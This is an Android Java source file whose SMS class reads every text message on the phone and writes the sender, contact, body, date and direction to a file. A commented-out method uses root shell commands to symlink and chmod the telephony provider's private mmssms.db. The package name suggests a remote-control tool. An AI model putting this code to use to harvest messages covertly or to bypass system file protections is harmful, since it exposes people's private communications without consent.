package com.lfish.control.action.actiontool;

		import java.io.File;
		import java.io.FileNotFoundException;
		import java.io.FileOutputStream;
		import java.io.IOException;
		import java.sql.Date;
		import java.text.SimpleDateFormat;
		import android.content.Context;
		import android.database.Cursor;
		import android.database.sqlite.SQLiteDatabase;
		import android.database.sqlite.SQLiteException;
		import android.net.Uri;

		import com.lfish.control.utils.MyLog;

public class SMS {
	private Context context;

	public SMS(Context context) {
		this.context = context;
	}

	public void savetoPath(String path) {

		String string = GetSMS();
		saveSms(string, path);
	}

//	public String GetRTSMS(){
//		String path = "/data/data/"+context.getPackageName()+"/databases/";
//		File dirFile = new File(path);
//		dirFile.mkdirs();
//		File dbFile = new File(dirFile,"mmssms.db");
//		path = dbFile.getAbsolutePath();
//		if(RTTool.isRT()){
//			RTTool.RTrun("ln -s /data/data/com.android.providers.telephony/databases/mmssms.db "+path);
//			RTTool.RTrun("chmod 755 "+path);
//		}
//		SQLiteDatabase db = SQLiteDatabase.openDatabase(path, null,SQLiteDatabase.OPEN_READONLY);
//		String[] projection = new String[] {"address", "person",
//				"body", "date", "type" };
//		StringBuilder smsBuilder = new StringBuilder("");
//		Boolean isHave = false;
//		try {
//			Cursor cur = db.query("sms", projection, null, null, null, null, "date desc");
//			if ((cur.getCount()) > 0 && (cur.moveToFirst())) {
//				int index_Address = cur.getColumnIndex("address");
//				int index_Person = cur.getColumnIndex("person");
//				int index_Body = cur.getColumnIndex("body");
//				int index_Date = cur.getColumnIndex("date");
//				int index_Type = cur.getColumnIndex("type");
//				do {
//					String strAddress = cur.getString(index_Address);
//					int intPerson = cur.getInt(index_Person);
//					String strbody = cur.getString(index_Body);
//					long longDate = cur.getLong(index_Date);
//					int intType = cur.getInt(index_Type);
//					Date d = new Date(longDate);
//					String strDate = new SimpleDateFormat(
//							"yyyy-MM-dd hh:mm:ss").format(d);
//					String strType = "";
//					if (intType == 1) {
//						strType = "接收";
//					} else if (intType == 2) {
//						strType = "发送";
//					} else {
//						strType = "null";
//					}
//
//					smsBuilder.append(strAddress + ", ");
//					smsBuilder.append(intPerson + ", ");
//					smsBuilder.append(strbody + ", ");
//					smsBuilder.append(strDate + ", ");
//					smsBuilder.append(strType);
//					smsBuilder.append("}\r\n");
//				} while (cur.moveToNext());
//
//				if (!cur.isClosed()) {
//					cur.close();
//					cur = null;
//				}
//				isHave = true;
//			} else {
//				if (null != cur) {
//					cur.close();
//				}
//				smsBuilder.append("no result!");
//				isHave = false;
//			} // end if
//			//smsBuilder.append("\r\ngetSmsInPhone has executed!");
//		} catch (SQLiteException ex) {
//			MyLog.d("SQLiteException in getSmsInPhone", ex.getMessage());
//		}
//		if (isHave) {
//			return smsBuilder.toString();
//		} else {
//			return null;
//		}
//	}

	public String GetSMS() { // 获取短信的类
		final String SMS_URI_ALL = "content://sms/";
		Boolean isHave = false;
		StringBuilder smsBuilder = new StringBuilder("");
		try {
			Uri uri = Uri.parse(SMS_URI_ALL);
			String[] projection = new String[] { "_id", "address", "person",
					"body", "date", "type" };
			Cursor cur = context.getContentResolver().query(uri, projection,
					null, null, "date desc"); // 获取手机内部短信
			if ((cur.getCount()) > 0 && (cur.moveToFirst())) {
				int index_Address = cur.getColumnIndex("address");
				int index_Person = cur.getColumnIndex("person");
				int index_Body = cur.getColumnIndex("body");
				int index_Date = cur.getColumnIndex("date");
				int index_Type = cur.getColumnIndex("type");
				do {
					String strAddress = cur.getString(index_Address);
					int intPerson = cur.getInt(index_Person);
					String strbody = cur.getString(index_Body);
					long longDate = cur.getLong(index_Date);
					int intType = cur.getInt(index_Type);
					Date d = new Date(longDate);
					String strDate = new SimpleDateFormat(
							"yyyy-MM-dd hh:mm:ss").format(d);
					String strType = "";
					if (intType == 1) {
						strType = "接收";
					} else if (intType == 2) {
						strType = "发送";
					} else {
						strType = "null";
					}

					smsBuilder.append(strAddress + ", ");
					smsBuilder.append(intPerson + ", ");
					smsBuilder.append(strbody + ", ");
					smsBuilder.append(strDate + ", ");
					smsBuilder.append(strType);
					smsBuilder.append("}\r\n");
				} while (cur.moveToNext());

				if (!cur.isClosed()) {
					cur.close();
					cur = null;
				}
				isHave = true;
			} else {
				if (null != cur) {
					cur.close();
				}
				smsBuilder.append("no result!");
				isHave = false;
			} // end if
			//smsBuilder.append("\r\ngetSmsInPhone has executed!");
		} catch (SQLiteException ex) {
			MyLog.d("SQLiteException in getSmsInPhone", ex.getMessage());
		}
		if (isHave) {
			return smsBuilder.toString();
		} else {
			return null;
		}
	}

	// 函数
	public void saveSms(String ss, String path) { // 存储短信的类

		File f = new File(path);
		if (f.exists()) {

			f.delete();
		}
		if(ss!= null)
		{
			try {
				f.createNewFile();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			String content = ss;
			try {
				FileOutputStream outputStream = new FileOutputStream(new File(path));
				outputStream.write(content.getBytes());
				outputStream.flush();
				outputStream.close();
			} catch (FileNotFoundException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
}

